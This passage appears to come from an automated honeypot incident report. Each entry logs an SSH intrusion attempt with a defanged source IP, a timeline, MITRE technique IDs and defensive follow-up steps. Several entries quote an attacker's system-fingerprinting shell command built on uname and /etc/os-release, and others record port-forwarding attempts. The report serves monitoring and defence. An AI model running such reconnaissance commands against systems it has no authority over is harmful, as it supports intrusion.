| `2026-07-30 02:28:41` | `cowrie.session.connect` |
| `2026-07-30 02:28:42` | `cowrie.client.version` |
| `2026-07-30 02:28:42` | `cowrie.client.kex` |
| `2026-07-30 02:28:44` | `cowrie.login.success` |
| `2026-07-30 02:28:45` | `cowrie.session.params` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.command.success` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.command.input` |
| `2026-07-30 02:28:45` | `cowrie.log.closed` |
| `2026-07-30 02:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-931d63d9f5de

| Field | Detail |
|---|---|
| **Source IP** | `65.20.149[.]26` |
| **First Seen** | 2026-07-30 02:29 |
| **Last Seen** | 2026-07-30 02:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:29:32` | `cowrie.session.connect` |
| `2026-07-30 02:29:33` | `cowrie.client.version` |
| `2026-07-30 02:29:33` | `cowrie.client.kex` |
| `2026-07-30 02:29:34` | `cowrie.login.success` |
| `2026-07-30 02:29:35` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.149[.]26` to AbuseIPDB if not already reported
- [ ] Block `65.20.149[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2986690956b4

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]98` |
| **First Seen** | 2026-07-30 02:29 |
| **Last Seen** | 2026-07-30 02:34 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:29:40` | `cowrie.session.connect` |
| `2026-07-30 02:29:40` | `cowrie.client.version` |
| `2026-07-30 02:29:40` | `cowrie.client.kex` |
| `2026-07-30 02:29:42` | `cowrie.login.success` |
| `2026-07-30 02:29:42` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]98` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-028612a2ab37

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:30 |
| **Last Seen** | 2026-07-30 02:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:30:08` | `cowrie.session.connect` |
| `2026-07-30 02:30:08` | `cowrie.client.version` |
| `2026-07-30 02:30:08` | `cowrie.client.kex` |
| `2026-07-30 02:30:10` | `cowrie.login.success` |
| `2026-07-30 02:30:11` | `cowrie.session.params` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.command.success` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.command.input` |
| `2026-07-30 02:30:11` | `cowrie.log.closed` |
| `2026-07-30 02:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-812980d96bec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:31 |
| **Last Seen** | 2026-07-30 02:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:31:34` | `cowrie.session.connect` |
| `2026-07-30 02:31:34` | `cowrie.client.version` |
| `2026-07-30 02:31:34` | `cowrie.client.kex` |
| `2026-07-30 02:31:36` | `cowrie.login.success` |
| `2026-07-30 02:31:37` | `cowrie.session.params` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.command.success` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.command.input` |
| `2026-07-30 02:31:37` | `cowrie.log.closed` |
| `2026-07-30 02:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-240f259eba5d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:33 |
| **Last Seen** | 2026-07-30 02:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:33:03` | `cowrie.session.connect` |
| `2026-07-30 02:33:03` | `cowrie.client.version` |
| `2026-07-30 02:33:03` | `cowrie.client.kex` |
| `2026-07-30 02:33:04` | `cowrie.login.success` |
| `2026-07-30 02:33:06` | `cowrie.session.params` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.command.success` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.command.input` |
| `2026-07-30 02:33:06` | `cowrie.log.closed` |
| `2026-07-30 02:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1107b3aa75

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:34 |
| **Last Seen** | 2026-07-30 02:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:34:35` | `cowrie.session.connect` |
| `2026-07-30 02:34:35` | `cowrie.client.version` |
| `2026-07-30 02:34:35` | `cowrie.client.kex` |
| `2026-07-30 02:34:36` | `cowrie.login.success` |
| `2026-07-30 02:34:37` | `cowrie.session.params` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:37` | `cowrie.command.success` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:37` | `cowrie.command.input` |
| `2026-07-30 02:34:38` | `cowrie.log.closed` |
| `2026-07-30 02:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd20836ba90b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:36 |
| **Last Seen** | 2026-07-30 02:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:36:06` | `cowrie.session.connect` |
| `2026-07-30 02:36:07` | `cowrie.client.version` |
| `2026-07-30 02:36:07` | `cowrie.client.kex` |
| `2026-07-30 02:36:08` | `cowrie.login.success` |
| `2026-07-30 02:36:09` | `cowrie.session.params` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.command.success` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.command.input` |
| `2026-07-30 02:36:09` | `cowrie.log.closed` |
| `2026-07-30 02:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e590c45dff0f

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-07-30 02:37 |
| **Last Seen** | 2026-07-30 02:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:37:28` | `cowrie.session.connect` |
| `2026-07-30 02:37:28` | `cowrie.client.version` |
| `2026-07-30 02:37:28` | `cowrie.client.kex` |
| `2026-07-30 02:37:29` | `cowrie.login.success` |
| `2026-07-30 02:37:29` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5729478ae24

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:37 |
| **Last Seen** | 2026-07-30 02:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:37:38` | `cowrie.session.connect` |
| `2026-07-30 02:37:39` | `cowrie.client.version` |
| `2026-07-30 02:37:39` | `cowrie.client.kex` |
| `2026-07-30 02:37:40` | `cowrie.login.success` |
| `2026-07-30 02:37:41` | `cowrie.session.params` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:41` | `cowrie.command.success` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:41` | `cowrie.command.input` |
| `2026-07-30 02:37:42` | `cowrie.log.closed` |
| `2026-07-30 02:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-905be66462ac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:39 |
| **Last Seen** | 2026-07-30 02:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:39:10` | `cowrie.session.connect` |
| `2026-07-30 02:39:10` | `cowrie.client.version` |
| `2026-07-30 02:39:10` | `cowrie.client.kex` |
| `2026-07-30 02:39:11` | `cowrie.login.success` |
| `2026-07-30 02:39:12` | `cowrie.session.params` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.command.success` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.command.input` |
| `2026-07-30 02:39:12` | `cowrie.log.closed` |
| `2026-07-30 02:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d632297498ba

| Field | Detail |
|---|---|
| **Source IP** | `218.200.9[.]182` |
| **First Seen** | 2026-07-30 02:40 |
| **Last Seen** | 2026-07-30 02:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:40:39` | `cowrie.session.connect` |
| `2026-07-30 02:40:40` | `cowrie.client.version` |
| `2026-07-30 02:40:40` | `cowrie.client.kex` |
| `2026-07-30 02:40:43` | `cowrie.login.success` |
| `2026-07-30 02:40:43` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.200.9[.]182` to AbuseIPDB if not already reported
- [ ] Block `218.200.9[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e58bb13011f4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:40 |
| **Last Seen** | 2026-07-30 02:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:40:46` | `cowrie.session.connect` |
| `2026-07-30 02:40:46` | `cowrie.client.version` |
| `2026-07-30 02:40:46` | `cowrie.client.kex` |
| `2026-07-30 02:40:47` | `cowrie.login.success` |
| `2026-07-30 02:40:48` | `cowrie.session.params` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:48` | `cowrie.command.success` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:48` | `cowrie.command.input` |
| `2026-07-30 02:40:49` | `cowrie.log.closed` |
| `2026-07-30 02:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-241fd823ac61

| Field | Detail |
|---|---|
| **Source IP** | `193.24.211[.]76` |
| **First Seen** | 2026-07-30 02:42 |
| **Last Seen** | 2026-07-30 02:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:42:06` | `cowrie.session.connect` |
| `2026-07-30 02:42:06` | `cowrie.client.version` |
| `2026-07-30 02:42:06` | `cowrie.client.kex` |
| `2026-07-30 02:42:07` | `cowrie.login.success` |
| `2026-07-30 02:42:07` | `cowrie.direct-tcpip.request` |
| `2026-07-30 02:42:07` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-30 02:42:07` | `cowrie.direct-tcpip.data` |
| `2026-07-30 02:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.24.211[.]76` to AbuseIPDB if not already reported
- [ ] Block `193.24.211[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265c8887a648

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 02:42 |
| **Last Seen** | 2026-07-30 02:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 02:42:19` | `cowrie.session.connect` |
| `2026-07-30 02:42:19` | `cowrie.client.version` |
| `2026-07-30 02:42:19` | `cowrie.client.kex` |
| `2026-07-30 02:42:20` | `cowrie.login.success` |
| `2026-07-30 02:42:21` | `cowrie.session.params` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:21` | `cowrie.command.success` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:21` | `cowrie.command.input` |
| `2026-07-30 02:42:22` | `cowrie.log.closed` |
| `2026-07-30 02:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92ee36b05c7d

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-07-30 02:43 |
| **Last Seen** | 2026-07-30 02:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

